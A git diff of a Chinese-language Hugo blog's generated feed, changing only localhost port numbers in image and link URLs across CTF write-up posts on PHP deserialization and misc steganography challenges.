+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214638378_hu7993321471651173480.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214638378_hu17770688708744733081.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601214638378&#34;
@@ -1689,10 +1689,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;然后直接访问就行，读不到。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214801826.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214801826.png&#34;
 	width=&#34;997&#34;
 	height=&#34;178&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214801826_hu11326285917372669088.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214801826_hu17062266406878678882.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214801826_hu11326285917372669088.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601214801826_hu17062266406878678882.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601214801826&#34;
@@ -1705,10 +1705,10 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;君の名は&#34;&gt;君の名は
 &lt;/h3&gt;&lt;h4 id=&#34;知识点反序列化原生类调用匿名函数&#34;&gt;知识点：反序列化原生类调用匿名函数
-&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601215414775.png&#34;
+&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601215414775.png&#34;
 	width=&#34;812&#34;
 	height=&#34;1194&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601215414775_hu3125771016891505675.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601215414775_hu1162333949366209950.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601215414775_hu3125771016891505675.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601215414775_hu1162333949366209950.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601215414775&#34;
@@ -1760,10 +1760,10 @@
 &lt;li&gt;ArrayObject::unserialize&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;​	获得exp&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601224941200.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601224941200.png&#34;
 	width=&#34;1405&#34;
 	height=&#34;1106&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601224941200_hu3377935223855933870.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601224941200_hu15577306685897720584.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601224941200_hu3377935223855933870.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601224941200_hu15577306685897720584.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601224941200&#34;
@@ -1775,10 +1775,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	这里是lambda_10，因为不知道这个匿名函数到底是几，我们爆破一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601230352626.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601230352626.png&#34;
 	width=&#34;1981&#34;
 	height=&#34;965&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601230352626_hu2655305326544633150.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601230352626_hu13966704549057617813.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601230352626_hu2655305326544633150.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250601230352626_hu13966704549057617813.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250601230352626&#34;
@@ -1793,10 +1793,10 @@
         </item>
         <item>
         <title>轩辕杯wp复盘</title>
-        <link>http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/</link>
+        <link>http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/</link>
         <pubDate>Wed, 28 May 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/</guid>
+        <guid>http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/</guid>
         <description>&lt;h2 id=&#34;前言&#34;&gt;前言
 &lt;/h2&gt;&lt;p&gt;​	轩辕杯misc惨败而归，痛定思痛，决定要好好猛学一下msic&lt;/p&gt;
 &lt;h2 id=&#34;misc&#34;&gt;Misc
@@ -1804,10 +1804,10 @@
 &lt;h3 id=&#34;哇哇哇瓦&#34;&gt;哇哇哇瓦
 &lt;/h3&gt;&lt;p&gt;​	附件图片&lt;/p&gt;
 &lt;p&gt;​	随波逐流一把梭，可以嗦出前半段&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/5d1b4ed27d3e42911dd71336a95de6f4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/5d1b4ed27d3e42911dd71336a95de6f4.png&#34;
 	width=&#34;772&#34;
 	height=&#34;788&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/5d1b4ed27d3e42911dd71336a95de6f4_hu16827644019446092746.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/5d1b4ed27d3e42911dd71336a95de6f4_hu3210708169331098090.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/5d1b4ed27d3e42911dd71336a95de6f4_hu16827644019446092746.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/5d1b4ed27d3e42911dd71336a95de6f4_hu3210708169331098090.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;5d1b4ed27d3e42911dd71336a95de6f4&#34;
@@ -1819,10 +1819,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	010查看后发现压缩包，打开后是一个hint，给了密钥和提示。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/643241fb98491e28e4710dc2479e55be.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/643241fb98491e28e4710dc2479e55be.png&#34;
 	width=&#34;1460&#34;
 	height=&#34;554&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/643241fb98491e28e4710dc2479e55be_hu9953373321869274730.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/643241fb98491e28e4710dc2479e55be_hu698658589359791676.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/643241fb98491e28e4710dc2479e55be_hu9953373321869274730.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/643241fb98491e28e4710dc2479e55be_hu698658589359791676.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;643241fb98491e28e4710dc2479e55be&#34;
@@ -1834,10 +1834,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	仔细观察图片发现图片右下角存在像素块。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522135608373.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522135608373.png&#34;
 	width=&#34;1001&#34;
 	height=&#34;583&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522135608373_hu9608242716657775329.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522135608373_hu2647005977205142961.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522135608373_hu9608242716657775329.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522135608373_hu2647005977205142961.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250522135608373&#34;
@@ -1849,10 +1849,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	到这里就不知道怎么做了，看了wp之后更加觉得离谱。这样可以提取出一个倒着的PK。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522140025904.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522140025904.png&#34;
 	width=&#34;1079&#34;
 	height=&#34;793&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522140025904_hu5364758747488951998.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522140025904_hu13767021351910046130.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522140025904_hu5364758747488951998.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250522140025904_hu13767021351910046130.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250522140605599&#34;
@@ -1864,10 +1864,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	总结一下，stegsolve过一遍的话要注意文件可能会倒过来。（吃了很多亏了）&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524160615706.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524160615706.png&#34;
 	width=&#34;1078&#34;
 	height=&#34;50&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524160615706_hu13165510363362105516.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524160615706_hu16182586471629241326.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524160615706_hu13165510363362105516.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524160615706_hu16182586471629241326.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250524160615706&#34;
@@ -1878,10 +1878,10 @@
 		data-flex-basis=&#34;5174px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524163547228.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524163547228.png&#34;
 	width=&#34;881&#34;
 	height=&#34;368&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524163547228_hu8473805226613666093.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524163547228_hu10510793796591476486.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524163547228_hu8473805226613666093.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524163547228_hu10510793796591476486.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250524163547228&#34;
@@ -1893,10 +1893,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	用脚本倒叙后为这样&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212305669.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212305669.png&#34;
 	width=&#34;1974&#34;
 	height=&#34;904&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212305669_hu3786231862342262560.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212305669_hu5877711609914976640.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212305669_hu3786231862342262560.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212305669_hu5877711609914976640.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250524212305669&#34;
@@ -1908,10 +1908,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	得到后半段&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212645402.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212645402.png&#34;
 	width=&#34;1089&#34;
 	height=&#34;551&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212645402_hu7768043103048344296.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212645402_hu8162046338331364789.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212645402_hu7768043103048344296.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524212645402_hu8162046338331364789.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250524212645402&#34;
@@ -1925,10 +1925,10 @@
 &lt;h3 id=&#34;数据审计&#34;&gt;数据审计
 &lt;/h3&gt;&lt;p&gt;​	很狗的题，txt、png、wav我都找到了，只有pdf，不知道里面还能藏xss&amp;hellip;&amp;hellip;&lt;/p&gt;
 &lt;p&gt;​	这里就记录一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213014943.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213014943.png&#34;
 	width=&#34;1802&#34;
 	height=&#34;386&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213014943_hu18064179293890439606.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213014943_hu4640072225261007459.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213014943_hu18064179293890439606.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213014943_hu4640072225261007459.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250524213014943&#34;
@@ -1941,10 +1941,10 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;隐藏的邀请&#34;&gt;隐藏的邀请
 &lt;/h3&gt;&lt;p&gt;​	docx文件，做法就是换成压缩包，然后能找到Cyyy.xml，里面有十六进制数据&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213448219.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213448219.png&#34;
 	width=&#34;908&#34;
 	height=&#34;705&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213448219_hu8688294397584978910.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213448219_hu6835673776495553811.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213448219_hu8688294397584978910.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524213448219_hu6835673776495553811.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250524213448219&#34;
@@ -1956,10 +1956,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	然后，居然是这个字符和文件名异或&amp;hellip;&amp;hellip;.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524214957350.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524214957350.png&#34;
 	width=&#34;1475&#34;
 	height=&#34;894&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524214957350_hu2987619588233794555.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524214957350_hu3690667131405430204.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524214957350_hu2987619588233794555.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524214957350_hu3690667131405430204.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250524214957350&#34;
@@ -1971,10 +1971,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	然后是Data Matrix 条码，在线网站解析一下即可（又长见识了）&lt;/p&gt;
-&lt;p&gt;​	&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524215245074.png&#34;
+&lt;p&gt;​	&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524215245074.png&#34;
 	width=&#34;1070&#34;
 	height=&#34;820&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524215245074_hu9294426974690295632.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524215245074_hu3182752224766210450.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524215245074_hu9294426974690295632.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250524215245074_hu3182752224766210450.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250524215245074&#34;
@@ -1987,10 +1987,10 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;音频的秘密&#34;&gt;音频的秘密
 &lt;/h3&gt;&lt;p&gt;​	wav，一听就知道是摩斯，在线网站可以嗦一下，发现是假的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525001828071.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525001828071.png&#34;
 	width=&#34;1467&#34;
 	height=&#34;616&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525001828071_hu9609494662884393013.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525001828071_hu4427803234055702174.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525001828071_hu9609494662884393013.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525001828071_hu4427803234055702174.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250525001828071&#34;
@@ -2002,10 +2002,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	那么音频里是没有思路了，试试隐写&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002155381.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002155381.png&#34;
 	width=&#34;481&#34;
 	height=&#34;757&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002155381_hu10525145174778557520.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002155381_hu17607082723337563509.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002155381_hu10525145174778557520.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002155381_hu17607082723337563509.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250525002155381&#34;
@@ -2017,10 +2017,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	建议低中高都试试，这里是低&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002506221.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002506221.png&#34;
 	width=&#34;650&#34;
 	height=&#34;475&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002506221_hu12036550565452792986.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002506221_hu17138423014493425827.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002506221_hu12036550565452792986.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525002506221_hu17138423014493425827.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250525002506221&#34;
@@ -2032,10 +2032,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	爆破可以多试试&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003517380.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003517380.png&#34;
 	width=&#34;661&#34;
 	height=&#34;249&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003517380_hu6421795221394364996.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003517380_hu15526787758457926071.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003517380_hu6421795221394364996.png 480w, http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003517380_hu15526787758457926071.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250525003517380&#34;
@@ -2047,10 +2047,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;得到图片后，RGB可以嗦&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003658305.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003658305.png&#34;
 	width=&#34;778&#34;
 	height=&#34;996&#34;
-	srcset=&#34;http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003658305_hu163632407760420025.png 480w, http://localhost:58266/p/%E8%BD%A9%E8%BE%95%E6%9D%AFwp%E5%A4%8D%E7%9B%98/image-20250525003658305_hu10900317150291096991.png 1024w&#34;
